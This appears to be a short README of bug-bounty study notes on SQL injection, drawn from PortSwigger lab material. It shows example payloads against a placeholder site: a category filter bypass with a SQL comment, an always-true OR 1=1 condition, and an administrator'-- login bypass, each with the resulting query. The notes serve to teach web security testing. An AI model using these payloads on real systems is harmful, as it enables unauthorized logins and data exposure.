# SQL-Injection_Bug_Bounty
##All taken fron portswigger lab

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:

	https://insecure-website.com/products?category=Gifts'--
This results in the SQL query:

	SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:

	https://insecure-website.com/products?category=Gifts'+OR+1=1--
  
	SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
	since 1=1 is always true
Check response:    ‘--      |   #--

**Subverting application logic/Login form:**

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:

	SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

![image](https://user-images.githubusercontent.com/37367596/192005023-3f13a816-0a13-4f0a-8ff5-cf85222e8604.png)

